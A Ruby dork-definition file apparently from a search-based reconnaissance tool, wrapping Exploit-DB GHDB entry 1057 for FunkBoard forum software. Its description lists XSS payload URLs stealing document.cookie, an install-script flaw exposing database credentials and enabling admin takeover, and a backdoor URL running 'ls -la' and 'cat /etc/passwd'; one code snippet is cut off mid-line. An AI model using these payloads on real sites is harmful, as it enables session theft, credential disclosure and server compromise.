module Dorks
   class Dork1057 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1057",
            ghdb_url: "https://www.exploit-db.com/ghdb/1057",
            severity: "2",
            category: "vulnerable_files",
            publish_date: "2005-08-08",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by FunkBoard"
EDORK
            description: <<~EDESC
FunkBoard V0.66CF (possibly prior versions) cross site scripting, possible database username/password disclosure & board takeover, possible remote code execution software: author site: http://www.[path_to_funkboard].co.uk/ xss: http://[target]/[path_to_funkboard]/editpost.php?fbusername="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/editpost.php?fbpassword="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/prefs.php?fbpassword="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/prefs.php?fbusername="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/newtopic.php?forumid=1&fbusername="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/newtopic.php?forumid=1&fbpassword="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/newtopic.php?forumid=1&subject="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/reply.php?forumid=1&threadid=1&fbusername="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/reply.php?forumid=1&threadid=1&fbpassword="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/profile.php?fbusername="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/profile.php?fbpassword="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?fbusername="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?fmail="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?www="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?icq="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?yim="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?location="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?sex="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?interebbies="&gt;alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?sig=alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?aim="&gt;alert(document.cookie) path disclosure: http://[target]/[path_to_funkboard]/images/forums.php database username & password disclosure: during installation is not remembered to delete the mysql_install script and the installation do not delete it, usually: http://[target]/[path]/admin/mysql_install.php or http://[target]/[path]/admin/pg_install.php there, a user can see database clear text username & password ... Then, the script let the user proceed to the next page, where he can reset funkboard administator username & password. Now the script faults, because some tables exist, etc. So user can go back and setting a new database name for installation, guessing among other installations on the server... Once Installation succeeded he can set new admin username e password then login at this page: http://[target]/[path]/[path_to_funkboard]/admin/index.php Now the user can edit templates and append some evil javascript code. remote code execution: look at this code in mysql_install.php : $infoout = " so, you have a backdoor on target system... you can launch commands by this urls: http://localhost:30/funkboard/info.php?command=ls%20-la to list directories... http://localhost:30/funkboard/info.php?command=cat%20/etc/passwd to see /etc/passwd file
EDESC
         })

      end
   end
end
